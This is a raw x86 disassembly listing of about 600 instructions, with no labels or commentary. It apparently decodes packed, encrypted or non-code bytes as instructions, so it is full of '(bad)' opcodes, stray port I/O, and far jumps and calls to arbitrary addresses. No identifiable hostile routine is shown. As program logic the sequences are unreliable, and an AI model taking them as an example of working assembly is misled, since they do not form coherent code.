  40c7f2:	inc    ebx
  40c7f3:	xor    eax,0xdc8a9a4
  40c7f8:	enter  0x237,0xb1
  40c7fc:	popf   
  40c7fd:	push   0xda59a9c5
  40c802:	outs   dx,DWORD PTR ds:[esi]
  40c803:	add    al,BYTE PTR [ebp-0x4a1a7c2a]
  40c809:	enter  0xb50b,0x4d
  40c80d:	xchg   bl,ah
  40c80f:	lods   eax,DWORD PTR ds:[esi]
  40c810:	lds    ebp,FWORD PTR [ecx-0x66]
  40c813:	mov    ebp,0x87c8f6e1
  40c818:	test   eax,0x2cc880ce
  40c81d:	retf   
  40c81e:	cmp    BYTE PTR [edi+0x6e],bh
  40c821:	and    BYTE PTR [esi],0xb7
  40c824:	(bad)  
  40c825:	(bad)  
  40c826:	shl    DWORD PTR [esi],1
  40c828:	aad    0x54
  40c82a:	add    al,0x79
  40c82c:	inc    edi
  40c82d:	xor    al,0x71
  40c82f:	fistp  DWORD PTR [eax]
  40c831:	and    BYTE PTR [ecx+0x51144a53],0xea
  40c838:	dec    esp
  40c839:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c83a:	mov    dl,0x64
  40c83c:	je     0x40c846
  40c83e:	ror    BYTE PTR [edx-0x2c37f8af],0x38
  40c845:	(bad)  
  40c847:	adc    dh,ch
  40c849:	out    dx,al
  40c84a:	inc    ebp
  40c84b:	stos   BYTE PTR es:[edi],al
  40c84c:	call   0x3878f995
  40c851:	mov    ds:0xac45ec11,eax
  40c856:	sbb    DWORD PTR [ebx-0x524e26bb],ebx
  40c85c:	(bad)  [edx+0x77]
  40c85f:	pop    es
  40c860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c861:	pop    ds
  40c862:	push   ss
  40c863:	out    dx,al
  40c864:	dec    ebx
  40c865:	xchg   esi,eax
  40c866:	pop    edi
  40c867:	xchg   ebx,eax
  40c868:	jmp    esp
  40c86a:	cmp    ebx,DWORD PTR [edi+0x5e2b7460]
  40c870:	mov    ebx,0x58aff586
  40c875:	jl     0x40c7f9
  40c877:	jge    0x40c859
  40c879:	xchg   edi,eax
  40c87a:	call   0x6b23774c
  40c87f:	xchg   ebp,eax
  40c880:	sbb    ch,bl
  40c882:	cld    
  40c883:	rol    DWORD PTR [edx-0x1f],cl
  40c886:	add    ebx,DWORD PTR [eax]
  40c888:	mov    dl,0xdb
  40c88a:	adc    al,0x6e
  40c88c:	ror    BYTE PTR [ebx+0x45030c45],1
  40c892:	or     BYTE PTR [ecx+0x458bf045],cl
  40c898:	in     al,0x85
  40c89a:	ror    BYTE PTR [edi],0x84
  40c89d:	jbe    0x40c8ad
  40c89f:	add    BYTE PTR [eax],al
  40c8a1:	mov    DWORD PTR [ebp-0x24],esi
  40c8a4:	push   0xb
  40c8a6:	pop    ecx
  40c8a7:	push   0x5
  40c8a9:	jmp    0x40ca07
  40c8ae:	stos   DWORD PTR es:[edi],eax
  40c8af:	xchg   DWORD PTR [eax-0x42c643da],ecx
  40c8b5:	fwait
  40c8b6:	adc    bh,bl
  40c8b8:	hlt    
  40c8b9:	call   0xf3f7:0x615df0eb
  40c8c0:	jle    0x40c940
  40c8c2:	aas    
  40c8c3:	jg     0x40c943
  40c8c5:	jle    0x40c88c
  40c8c7:	dec    edi
  40c8c8:	xchg   ebx,edx
  40c8ca:	ins    DWORD PTR es:[edi],dx
  40c8cb:	and    DWORD PTR [esi],edx
  40c8cd:	sbb    al,0xe1
  40c8cf:	rol    DWORD PTR [eax+0x5],0xfb
  40c8d3:	or     DWORD PTR [edi+eax*4],0x2d
  40c8d7:	sahf   
  40c8d8:	inc    edx
  40c8d9:	cmp    ch,BYTE PTR [edx]
  40c8db:	mov    ebp,0xdccaff8
  40c8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8e1:	into   
  40c8e2:	call   0x9d212df9
  40c8e7:	rol    DWORD PTR ds:0xd06230b6,cl
  40c8ed:	jae    0x40c90b
  40c8ef:	push   esi
  40c8f0:	and    edi,ecx
  40c8f2:	jl     0x40c8c9
  40c8f4:	gs push esi
  40c8f6:	or     ch,BYTE PTR [edi+ecx*4]
  40c8f9:	test   eax,0xeb067efe
  40c8fe:	add    cl,ch
  40c900:	nop
  40c901:	leave  
  40c902:	inc    edi
  40c903:	cmp    eax,0xc559522d
  40c908:	scas   eax,DWORD PTR es:[edi]
  40c909:	into   
  40c90a:	js     0x40c932
  40c90c:	(bad)  
  40c90d:	mov    ah,0x25
  40c90f:	sub    eax,0xd0a4625f
  40c914:	push   ebx
  40c915:	cs int 0x3e
  40c918:	fs gs (bad) 
  40c91b:	hlt    
  40c91c:	cmp    al,0x76
  40c91e:	pop    esi
  40c91f:	shl    esp,1
  40c921:	cwde   
  40c922:	(bad)  
  40c923:	cmp    DWORD PTR [edi],eax
  40c925:	inc    edx
  40c926:	push   ds
  40c927:	test   eax,0xd3a3e6b5
  40c92c:	cmp    eax,0x85b74a9f
  40c931:	or     DWORD PTR [ebp-0xb],ebx
  40c934:	xchg   DWORD PTR [esi+esi*8+0x363cd08e],ebx
  40c93b:	xchg   eax,ebx
  40c93d:	push   ds
  40c93e:	inc    ebx
  40c93f:	add    ch,BYTE PTR [edi*4+0x3fca00bf]
  40c946:	sub    DWORD PTR [ecx+edx*4],ecx
  40c949:	dec    esp
  40c94a:	das    
  40c94b:	ror    bh,1
  40c94d:	iret   
  40c94e:	pop    ecx
  40c94f:	xchg   DWORD PTR [esi-0x71],edx
  40c952:	and    DWORD PTR [eax+edi*2-0x282e2fc],ebx
  40c959:	dec    ebp
  40c95a:	mov    bl,0xa4
  40c95c:	rol    BYTE PTR [edx+ecx*8+0x70a42522],1
  40c963:	xchg   ecx,eax
  40c964:	into   
  40c965:	push   ss
  40c966:	mov    cl,0x11
  40c968:	fld    st(7)
  40c96a:	push   edi
  40c96b:	mov    bh,0x2d
  40c96d:	inc    ecx
  40c96e:	scas   al,BYTE PTR es:[edi]
  40c96f:	sub    DWORD PTR [ecx],ebx
  40c971:	in     eax,0xe1
  40c973:	loopne 0x40c9af
  40c975:	in     al,dx
  40c976:	cmp    al,0x85
  40c978:	mov    dl,0x8c
  40c97a:	adc    al,0x9d
  40c97c:	stc    
  40c97d:	jbe    0x40c9f1
  40c97f:	xor    dh,BYTE PTR [edx-0x2db0eb50]
  40c985:	(bad)  
  40c986:	loop   0x40c923
  40c988:	loop   0x40c92c
  40c98a:	or     bl,BYTE PTR [ebp-0xf]
  40c98d:	push   0x7b
  40c98f:	sahf   
  40c990:	push   ebx
  40c991:	push   edx
  40c992:	xchg   ecx,eax
  40c993:	add    DWORD PTR [edi+0x69c5d468],0xf1b4c695
  40c99d:	sub    eax,0x68c19ea9
  40c9a2:	xor    al,0xbd
  40c9a4:	sbb    al,0xb6
  40c9a6:	add    al,0x73
  40c9a8:	jbe    0x40c9d2
  40c9aa:	out    dx,eax
  40c9ab:	fild   QWORD PTR [eax]
  40c9ad:	js     0x40c9db
  40c9af:	push   ecx
  40c9b0:	add    eax,0x34c18d49
  40c9b5:	xchg   esi,eax
  40c9b6:	jmp    FWORD PTR [eax]
  40c9b8:	push   es
  40c9b9:	or     esp,ecx
  40c9bb:	fnstcw WORD PTR [ecx]
  40c9bd:	push   ss
  40c9be:	add    esp,DWORD PTR ds:0xb27e64f8
  40c9c4:	inc    edi
  40c9c5:	push   edi
  40c9c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c7:	inc    ecx
  40c9c8:	sar    DWORD PTR [edx+ecx*4-0x553dd45],cl
  40c9cf:	and    ecx,DWORD PTR [edi+0x33]
  40c9d2:	mov    esp,0xa895f91e
  40c9d7:	pop    edi
  40c9d8:	sbb    BYTE PTR [edi],cl
  40c9da:	aad    0xd6
  40c9dc:	adc    eax,DWORD PTR [eax+0x54]
  40c9df:	adc    esi,edi
  40c9e1:	inc    si
  40c9e3:	mov    ebx,0x3e06a2e6
  40c9e8:	mov    ebx,0x5e283ae7
  40c9ed:	jae    0x40ca2f
  40c9ef:	pop    ebx
  40c9f0:	cli    
  40c9f1:	mov    ebx,0x892cb7f8
  40c9f6:	xchg   esi,eax
  40c9f7:	ins    WORD PTR es:[edi],dx
  40c9f9:	mov    eax,0x58b3879e
  40c9fe:	and    al,ch
  40ca00:	xchg   esi,eax
  40ca01:	jmp    0x83bbbec6
  40ca06:	fs dec ecx
  40ca08:	jmp    0x40cb66
  40ca0d:	and    DWORD PTR [esi+eax*2+0x65fd5b1b],edx
  40ca14:	lods   al,BYTE PTR ds:[esi]
  40ca15:	retf   
  40ca16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca17:	sub    eax,0xba815fcf
  40ca1c:	call   0x7f3f:0x7e7ef448
  40ca23:	jle    0x40caa3
  40ca25:	jmp    0x6b65:0xea1b756b
  40ca2c:	dec    BYTE PTR [ecx-0xa]
  40ca2f:	ins    DWORD PTR es:[edi],dx
  40ca30:	in     al,dx
  40ca31:	mov    esi,0xaf1b05c7
  40ca36:	push   ds
  40ca37:	xchg   edi,eax
  40ca38:	adc    BYTE PTR [edi-0x5d8e49df],ah
  40ca3e:	push   ss
  40ca3f:	and    ecx,DWORD PTR [ecx]
  40ca41:	scas   eax,DWORD PTR es:[edi]
  40ca42:	fsub   QWORD PTR [ebp+0x7602c860]
  40ca48:	xor    eax,0x652d72ee
  40ca4d:	xor    eax,0x3e9d45b9
  40ca52:	(bad)  
  40ca53:	out    0x68,al
  40ca55:	sbb    DWORD PTR [ecx-0x1f51bf8f],0xf073894
  40ca5f:	outs   dx,DWORD PTR ds:[esi]
  40ca60:	jbe    0x40c9fa
  40ca62:	jmp    0x40ca2a
  40ca64:	dec    eax
  40ca65:	add    cl,BYTE PTR [eax+0x1]
  40ca68:	int    0x2
  40ca6a:	bound  edi,QWORD PTR [edx]
  40ca6c:	and    al,0x33
  40ca6e:	mov    eax,ds:0x7d0402de
  40ca73:	scas   al,BYTE PTR es:[edi]
  40ca74:	add    al,0xb3
  40ca76:	sub    DWORD PTR [ecx-0x235ac00b],esi
  40ca7c:	jae    0x40ca5e
  40ca7e:	pop    esp
  40ca7f:	mov    edx,0xd791515
  40ca84:	jmp    0x40ca59
  40ca86:	push   DWORD PTR [edi-0x65]
  40ca89:	jmp    0x40cab4
  40ca8b:	sub    BYTE PTR [esi-0x147958cb],dh
  40ca91:	push   ds
  40ca92:	mov    ah,0xe8
  40ca94:	push   0xffffff9e
  40ca96:	push   ecx
  40ca97:	lahf   
  40ca98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca99:	or     al,0x8
  40ca9b:	sti    
  40ca9c:	mov    esi,0x71234e0e
  40caa1:	pop    edx
  40caa2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caa3:	jno    0x40ca89
  40caa5:	push   eax
  40caa6:	xchg   ecx,eax
  40caa7:	push   ebx
  40caa8:	jmp    0x8d50fc0a
  40caad:	xor    DWORD PTR [ebx-0x1],esp
  40cab0:	sub    al,bh
  40cab2:	xchg   BYTE PTR [esi],ah
  40cab4:	(bad)  
  40cab5:	out    dx,al
  40cab6:	mov    edx,0x5cc734ed
  40cabb:	aaa    
  40cabc:	or     al,0x26
  40cabe:	cmp    BYTE PTR [esp-0x68],bh
  40cac2:	gs pop es
  40cac4:	xor    eax,0x95363138
  40cac9:	pop    ds
  40caca:	adc    eax,0xf7c4172b
  40cacf:	and    bl,dl
  40cad1:	scas   eax,DWORD PTR es:[edi]
  40cad2:	inc    edi
  40cad3:	pop    ebp
  40cad4:	rcl    BYTE PTR [edi+edx*2],cl
  40cad7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cad8:	rol    dl,1
  40cada:	pop    ebp
  40cadb:	dec    edx
  40cadc:	mov    ebx,0xb2a47811
  40cae1:	test   BYTE PTR [ebp+ebx*2-0x50a01b1b],0x65
  40cae9:	mov    dl,0xb9
  40caeb:	dec    edi
  40caec:	pop    eax
  40caed:	and    BYTE PTR [edi-0x2392eb5b],ah
  40caf3:	sahf   
  40caf4:	xchg   esp,eax
  40caf5:	or     bh,BYTE PTR es:[edx-0x15]
  40caf9:	mov    dh,0xaa
  40cafb:	xchg   esp,eax
  40cafc:	mov    al,ds:0xdd126f1
  40cb01:	(bad)  
  40cb02:	or     ecx,ebx
  40cb04:	mov    al,0xc9
  40cb06:	mov    ecx,DWORD PTR [ebp+esi*8-0x66]
  40cb0a:	pusha  
  40cb0b:	mov    dh,0xab
  40cb0d:	mov    ch,0xf5
  40cb0f:	mov    al,0x13
  40cb11:	mov    eax,ds:0xf0d21554
  40cb16:	outs   dx,DWORD PTR ds:[esi]
  40cb17:	imul   edx,DWORD PTR [ebx-0x2ef245cf],0xffffffb9
  40cb1e:	pop    esp
  40cb1f:	fld    QWORD PTR [edx]
  40cb21:	cwde   
  40cb22:	sbb    DWORD PTR [edi-0x6b40219d],edx
  40cb28:	inc    ebx
  40cb29:	int    0x6f
  40cb2b:	dec    edx
  40cb2c:	mov    ch,0x55
  40cb2e:	and    al,0x28
  40cb30:	xchg   ebx,eax
  40cb31:	pusha  
  40cb32:	out    0xd3,eax
  40cb34:	push   ds
  40cb35:	fwait
  40cb36:	dec    edi
  40cb37:	fucomip st,st(2)
  40cb39:	mov    BYTE PTR [edx],ch
  40cb3b:	test   eax,0x152c705e
  40cb40:	xlat   BYTE PTR ds:[ebx]
  40cb42:	xchg   esi,eax
  40cb43:	das    
  40cb44:	int3   
  40cb45:	add    BYTE PTR [ecx+0x60],0xc1
  40cb49:	mov    bh,BYTE PTR [edx]
  40cb4b:	aam    0xc6
  40cb4d:	pop    eax
  40cb4e:	jl     0x40cb19
  40cb50:	in     eax,dx
  40cb51:	retf   
  40cb52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb53:	scas   eax,DWORD PTR es:[edi]
  40cb54:	dec    edi
  40cb55:	add    DWORD PTR [edi+ebp*8],ecx
  40cb58:	retf   0x4edb
  40cb5b:	das    
  40cb5c:	pop    ss
  40cb5d:	adc    esi,ebx
  40cb5f:	push   esi
  40cb60:	push   ebx
  40cb61:	(bad)  [esp-0x78a427cd]
  40cb68:	retf   
  40cb69:	sub    ebx,ecx
  40cb6b:	xchg   ebx,ecx
  40cb6d:	dec    ecx
  40cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
  40cb71:	imul   eax,ecx
  40cb74:	sub    esp,eax
  40cb76:	mov    DWORD PTR [ebp-0x24],esp
  40cb79:	jmp    0x40ccd7
  40cb7e:	jp     0x40cb94
  40cb80:	rcr    eax,0x59
  40cb83:	std    
  40cb84:	jnp    0x40cb1a
  40cb86:	mov    BYTE PTR [ebp-0x29],ch
  40cb89:	jl     0x40cb78
  40cb8b:	pop    es
  40cb8c:	gs cmp al,0x9
  40cb8f:	idiv   BYTE PTR [esi+0x7e]
  40cb92:	aas    
  40cb93:	jg     0x40cc13
  40cb95:	jle    0x40cb60
  40cb97:	push   esi
  40cb98:	jmp    0x40cc00
  40cb9a:	sahf   
  40cb9b:	pop    DWORD PTR [esi]
  40cb9d:	add    esi,DWORD PTR [ebx-0x7]
  40cba0:	pushf  
  40cba1:	and    eax,DWORD PTR [esi]
  40cba3:	std    
  40cba4:	and    eax,0x3ca25d2
  40cba9:	sbb    eax,0x93371276
  40cbae:	aaa    
  40cbaf:	xor    DWORD PTR [esi+0x57],0xffffffa6
  40cbb3:	imul   ecx,ecx,0x22c8974b
  40cbb9:	adc    bh,BYTE PTR [eax+0x40e438ab]
  40cbbf:	cmp    cl,BYTE PTR [esi]
  40cbc1:	mov    BYTE PTR [edi-0x48],al
  40cbc4:	and    cl,BYTE PTR [esi+0x5965140b]
  40cbca:	mov    edx,0x46c3441e
  40cbcf:	sbb    BYTE PTR ss:[edx-0x15],bl
  40cbd3:	pushf  
  40cbd4:	lds    eax,FWORD PTR [edx-0x7415f15b]
  40cbda:	fmul   st(7),st
  40cbdc:	inc    ebx
  40cbdd:	push   edi
  40cbde:	out    0xe5,eax
  40cbe0:	ret    0x4502
  40cbe3:	mov    DWORD PTR [edi+0x78232afe],edi
  40cbe9:	xor    dh,BYTE PTR [edi-0x52]
  40cbec:	jb     0x40cbe5
  40cbee:	add    eax,0x859ef74a
  40cbf3:	pop    ecx
  40cbf4:	sar    DWORD PTR [edi+eiz*8],0x58
  40cbf8:	fdivr  QWORD PTR [eax]
  40cbfa:	xchg   edi,eax
  40cbfb:	inc    esp
  40cbfc:	mov    bl,0xa5
  40cbfe:	inc    ecx
  40cbff:	jns    0x40cb85
  40cc01:	mov    ch,0x9f
  40cc03:	fidiv  DWORD PTR [edi+0x19]
  40cc06:	jb     0x40cc35
  40cc08:	mov    ds,edx
  40cc0a:	xor    ebp,DWORD PTR [edi-0x1e]
  40cc0d:	push   ecx
  40cc0e:	sub    DWORD PTR [edx+0x58981674],esi
  40cc14:	pop    es
  40cc15:	add    esi,edi
  40cc17:	push   eax
  40cc18:	fdiv   DWORD PTR [ebx]
  40cc1a:	xchg   esi,eax
  40cc1b:	push   esi
  40cc1c:	inc    esi
  40cc1d:	std    
  40cc1e:	add    DWORD PTR [ebp+0x2d40127c],0xffffffe1
  40cc25:	or     al,0x58
  40cc27:	stc    
  40cc28:	mov    ah,0x93
  40cc2a:	sub    BYTE PTR [esi-0x9871a12],ah
  40cc30:	hlt    
  40cc31:	lods   eax,DWORD PTR ds:[esi]
  40cc32:	mov    dl,0xe6
  40cc34:	adc    dl,BYTE PTR [edi-0x3cc2ab1a]
  40cc3a:	mov    ah,0x15
  40cc3c:	daa    
  40cc3d:	icebp  
  40cc3e:	xor    al,0x62
  40cc40:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc42:	or     eax,0x1ff8ebb6
  40cc47:	jmp    0x757d:0xa77e59
  40cc4e:	push   edx
  40cc4f:	lahf   
  40cc50:	mov    ebx,0xb7026b8c
  40cc55:	gs mov cl,0xcb
  40cc58:	pop    ss
  40cc59:	jge    0x40cc8a
  40cc5b:	stos   BYTE PTR es:[edi],al
  40cc5c:	out    0x1d,eax
  40cc5e:	stos   BYTE PTR es:[edi],al
  40cc5f:	pop    edi
  40cc60:	sbb    eax,0x26659d73
  40cc65:	ret    
  40cc66:	mov    al,0xed
  40cc68:	lea    edi,[ecx+0x2a]
  40cc6b:	adc    dh,bl
  40cc6d:	(bad)  
  40cc6e:	cmp    DWORD PTR [esi],esp
  40cc70:	push   0xfdf78baf
  40cc75:	or     al,0xc9
  40cc77:	inc    esi
  40cc78:	cmp    eax,0x58d239a9
  40cc7d:	jno    0x40ccb3
  40cc7f:	mov    ecx,0x8f28037f
  40cc84:	mov    ds:0xcb1b276a,al
  40cc89:	add    al,BYTE PTR [ecx+eiz*8-0x41]
  40cc8d:	in     al,0xee
  40cc8f:	dec    esi
  40cc90:	and    DWORD PTR [esi],eax
  40cc92:	push   0x46
  40cc94:	sub    eax,0xfd367542
  40cc99:	pop    edx
  40cc9a:	adc    cl,BYTE PTR [ecx-0xe]
  40cc9d:	sbb    DWORD PTR [esi],esp
  40cc9f:	int    0x91
  40cca1:	sub    esp,DWORD PTR [ebp-0x6d0b2f97]
  40cca7:	inc    esi
  40cca8:	in     al,dx
  40cca9:	ret    0x7107
  40ccac:	or     DWORD PTR [ecx+0xe],ebp
  40ccaf:	sub    eax,0xc531052f
  40ccb4:	mov    ebx,0x303bf1a0
  40ccb9:	je     0x40ccd8
  40ccbb:	int3   
  40ccbc:	push   ebx
  40ccbd:	in     eax,dx
  40ccbe:	dec    edx
  40ccbf:	in     al,dx
  40ccc0:	stos   DWORD PTR es:[edi],eax
  40ccc1:	xchg   edx,eax
  40ccc2:	add    al,bh
  40ccc4:	jbe    0x40cd36
  40ccc6:	lods   al,BYTE PTR ds:[esi]
  40ccc7:	jge    0x40cd02
  40ccc9:	inc    ebx
  40ccca:	(bad)  
  40cccb:	out    dx,al
  40cccc:	adc    dl,dl
  40ccce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cccf:	dec    ebp
  40ccd0:	in     eax,dx
  40ccd1:	inc    eax
  40ccd2:	sub    eax,0x706ec48b
  40ccd7:	mov    eax,DWORD PTR [ebp-0x4]
  40ccda:	mov    ecx,0x7510856
  40ccdf:	jmp    0x40ce3d
  40cce4:	test   DWORD PTR [ebx+0x4e],esi
  40cce7:	test   al,0x40
  40cce9:	jge    0x40cd68
  40cceb:	cmp    edi,DWORD PTR ds:0x9ec1d3a
  40ccf1:	fs in  al,dx
  40ccf3:	int3   
  40ccf4:	retf   0x7ef7
  40ccf7:	jle    0x40cd38
  40ccf9:	jg     0x40cd79
  40ccfb:	jle    0x40cd01
  40ccfd:	gs mov bh,0x9f
  40cd00:	adc    esp,edi
  40cd02:	rol    dl,cl
  40cd04:	(bad)  
  40cd05:	xchg   esp,eax
  40cd06:	mov    ch,0xd2
  40cd08:	mov    dl,0x90
  40cd0a:	pusha  
  40cd0b:	jle    0x40cc98
  40cd0d:	inc    ebp
  40cd0e:	pop    edi
  40cd0f:	dec    ebp
  40cd10:	bound  ebx,QWORD PTR [ecx+0x1eef1249]
  40cd16:	xchg   BYTE PTR [ebp-0x6e5d359b],bl
  40cd1c:	call   0x70e1a739
  40cd21:	xchg   edi,eax
  40cd22:	outs   dx,BYTE PTR ds:[esi]
  40cd23:	(bad)  
  40cd24:	dec    ebx
  40cd25:	in     eax,dx
  40cd26:	add    al,0xe0
  40cd28:	call   DWORD PTR [esi-0x38]
  40cd2b:	mov    dl,0xef
  40cd2d:	add    ebx,edi
  40cd2f:	sbb    dl,BYTE PTR [esi]
  40cd31:	aam    0x9d
  40cd33:	call   DWORD PTR [esi-0x708dd9ef]
  40cd39:	mov    esi,0x28962d27
  40cd3e:	sub    al,0xe2
  40cd40:	out    0x54,al
  40cd42:	mov    dl,0xca
  40cd44:	sahf   
  40cd45:	std    
  40cd46:	push   ss
  40cd47:	and    eax,0x93dc014
  40cd4c:	fdiv   QWORD PTR [eax]
  40cd4e:	xor    cl,BYTE PTR [eax]
  40cd50:	sub    eax,0x9f31b6c5
  40cd55:	or     ecx,DWORD PTR [ecx+0x40123714]
  40cd5b:	xor    eax,DWORD PTR [ebx+ecx*2+0x15]
  40cd5f:	cs arpl si,sp
  40cd62:	imul   esi,esp,0xf98b1f72
  40cd68:	retf   
  40cd69:	mov    edi,DWORD PTR [eax]
  40cd6b:	outs   dx,DWORD PTR ds:[esi]
  40cd6c:	push   ss
  40cd6d:	jmp    0x327eae99
  40cd72:	or     BYTE PTR [ebp+0x7d],ch
  40cd75:	mov    ebx,0xf93d82cc
  40cd7a:	mov    eax,0xff2de53c
  40cd7f:	leave  
  40cd80:	or     al,0x57
  40cd82:	icebp  
  40cd83:	and    eax,0x13b0f53f
  40cd88:	mov    ebx,0xb40bad6f
  40cd8d:	popf   
  40cd8e:	adc    eax,DWORD PTR [edx+ecx*4]
  40cd91:	ja     0x40cdf6
  40cd93:	xchg   BYTE PTR [ebx+0x2d],ch
  40cd96:	cli    
  40cd97:	cmc    
  40cd98:	lahf   
  40cd99:	shl    DWORD PTR [eax],1
  40cd9b:	pop    esp
  40cd9c:	push   0x25ab1e47
  40cda1:	fst    DWORD PTR [ecx+0x264999f6]
  40cda7:	push   eax
  40cda8:	jle    0x40cdba
  40cdaa:	data16 test al,0x63
  40cdad:	std    
  40cdae:	mov    edi,0x463eb0e1
  40cdb3:	(bad)  
  40cdb4:	(bad)  
  40cdb5:	dec    ebp
  40cdb6:	ret    0xce8b
  40cdb9:	daa    
  40cdba:	pop    edx
  40cdbb:	and    al,bh
  40cdbd:	out    dx,eax
  40cdbe:	mov    ch,BYTE PTR [edx-0x1b]
  40cdc1:	mov    esp,0x22c8417f
  40cdc6:	(bad)  
  40cdc7:	(bad)  
  40cdc8:	mov    esi,0x4869b841
  40cdcd:	inc    esp
  40cdce:	test   DWORD PTR [edx],esp
  40cdd0:	sub    ebp,DWORD PTR [ecx+0x21]
  40cdd3:	sbb    DWORD PTR [esp+eax*4+0x5615b23a],ebx
  40cdda:	cmp    BYTE PTR [eax-0x166a8e50],bl
  40cde0:	popa   
  40cde1:	push   eax
  40cde2:	xor    bh,dh
  40cde4:	mov    ebp,0x8140680
  40cde9:	xchg   ebx,eax
  40cdea:	sub    al,al
  40cdec:	dec    ebx
  40cded:	push   es
  40cdee:	enter  0x17c0,0x2d
  40cdf2:	mov    ds:0xc77a596e,eax
  40cdf7:	add    al,al
  40cdf9:	jp     0x40ce62
  40cdfb:	xchg   ebx,eax
  40cdfc:	xor    al,al
  40cdfe:	xor    al,0xd
  40ce00:	int    0xc4
  40ce02:	ins    DWORD PTR es:[edi],dx
  40ce03:	dec    ecx
  40ce04:	sbb    ch,BYTE PTR [edx-0x1982e16b]
  40ce0a:	push   ecx
  40ce0b:	or     al,0x99
  40ce0d:	add    eax,0xe22b4449
  40ce12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce13:	mov    al,ds:0x2bd7b917
  40ce18:	add    eax,0x80b6fbdc
  40ce1d:	jmp    0xc4fc3741
  40ce22:	outs   dx,DWORD PTR ds:[esi]
  40ce23:	shl    DWORD PTR [eax-0x58],cl
  40ce26:	inc    edi
  40ce27:	cmp    al,0xf0
  40ce29:	jmp    0x63f3:0xfea50f74
  40ce30:	inc    ecx
  40ce31:	sbb    al,0xef
  40ce33:	adc    ch,BYTE PTR [ebx-0x11]
  40ce36:	push   edx
  40ce37:	sbb    eax,0xe4e28ff9
  40ce3c:	dec    ebx
  40ce3d:	xor    eax,ecx
  40ce3f:	mov    edx,0x32729d
  40ce44:	add    eax,edx
  40ce46:	jmp    0x40cfa4
  40ce4b:	mov    dl,0xd7
  40ce4d:	or     al,0x5b
  40ce4f:	lods   eax,DWORD PTR ds:[esi]
  40ce50:	jge    0x40ce97
  40ce52:	out    0xb5,eax
  40ce54:	mov    ds:0xf53f5331,eax
  40ce59:	shl    BYTE PTR [ebp+0x7e7e888b],1
  40ce5f:	aas    
  40ce60:	jg     0x40cee0
  40ce62:	jle    0x40ceda
  40ce64:	cld    
  40ce65:	and    eax,0x8cf4db28
  40ce6a:	lock xor ebx,ecx
  40ce6d:	fiadd  DWORD PTR [esi-0x7]
  40ce70:	sbb    al,BYTE PTR [ecx+0x6a]
  40ce73:	std    
  40ce74:	sub    BYTE PTR [eax+eax*4+0x70e006a0],ah
  40ce7b:	imul   edi,DWORD PTR [ecx],0xffffff84
  40ce7e:	mov    ds,WORD PTR [edi+eiz*2-0x596c4cef]
  40ce85:	mov    eax,0x8571b1a
  40ce8a:	jg     0x40cec2
  40ce8c:	rcr    DWORD PTR [edx-0x72],cl
  40ce8f:	stos   BYTE PTR es:[edi],al
  40ce90:	jp     0x40cecb
  40ce92:	or     DWORD PTR [esi+0x64],edx
  40ce95:	aaa    
  40ce96:	jmp    0xfc91ee40
  40ce9b:	add    DWORD PTR [eax],ebx
  40ce9d:	cmp    al,0xfc
  40ce9f:	in     al,dx
  40cea0:	add    eax,0xfa17b081
  40cea5:	jmp    0x40ce9f
  40cea7:	inc    eax
  40cea8:	popa   
  40cea9:	cli    
  40ceaa:	xor    DWORD PTR [eax-0x58bc53b9],0x71d40fea
  40ceb4:	call   0xd1c0945b
  40ceb9:	mov    esi,0x249acf3e
  40cebe:	push   esi
  40cebf:	xor    eax,0xf18b9c8d
  40cec4:	js     0x40cede
  40cec6:	or     DWORD PTR [edx-0x19],0xffffff86
  40ceca:	aam    0xc7
  40cecc:	jle    0x40cec3
  40cece:	adc    al,ah
  40ced0:	scas   eax,DWORD PTR es:[edi]
  40ced1:	retf   
  40ced2:	icebp  
  40ced3:	inc    ecx
  40ced4:	inc    esp
  40ced5:	loope  0x40cf03
  40ced7:	push   edx
  40ced8:	enter  0x9867,0x6a
  40cedc:	jmp    0x40cf58
  40cede:	pop    esi
  40cedf:	in     al,dx
  40cee0:	fs xor al,0xcb
  40cee3:	fisttp QWORD PTR [edx]
  40cee5:	std    
  40cee6:	ror    DWORD PTR [eax+0x15f6900d],cl
  40ceec:	jnp    0x40cf6d
  40ceee:	dec    eax
  40ceef:	sbb    ch,0xfd
  40cef2:	ja     0x40cec6
  40cef4:	(bad)  
  40cef5:	into   
  40cef6:	hlt    
  40cef7:	ins    BYTE PTR es:[edi],dx
  40cef8:	(bad)  
  40cefa:	out    dx,al
  40cefb:	mov    ecx,0xf546657a
  40cf00:	and    al,0x33
  40cf02:	add    al,0x91
  40cf04:	and    al,0xd2
  40cf06:	out    0x4e,eax
  40cf08:	cmp    eax,0xcee0641c
  40cf0d:	mov    al,ds:0x56f38120
  40cf12:	lds    eax,FWORD PTR [edi]
  40cf14:	inc    DWORD PTR [ebx-0x32]
  40cf17:	or     eax,0x102c8335
  40cf1c:	neg    DWORD PTR [edx+0x35]
  40cf1f:	or     al,0xc2
  40cf21:	push   ebp
  40cf22:	stos   DWORD PTR es:[edi],eax
  40cf23:	clc    
  40cf24:	sub    esp,DWORD PTR [eax]
  40cf26:	inc    eax
  40cf27:	jle    0x40cf2e
  40cf29:	mov    ecx,esi
  40cf2b:	cmp    cl,BYTE PTR [ecx-0x4857e1e5]
  40cf31:	pop    ss
  40cf32:	push   edx
  40cf33:	mov    al,0xa9
  40cf35:	cmp    BYTE PTR [ecx],dl
  40cf37:	pusha  
  40cf38:	(bad)  
  40cf39:	outs   dx,DWORD PTR ds:[esi]
  40cf3a:	or     eax,0x93c0e3a9
  40cf3f:	inc    ecx
  40cf40:	pusha  
  40cf41:	pop    eax
  40cf42:	mov    bl,0xd8
  40cf44:	ret    0x1156
  40cf47:	ja     0x40cf6a
  40cf49:	jmp    0x16d2:0x2c6d1da4
  40cf50:	call   0xbda8:0x9c2adaac
  40cf57:	cli    
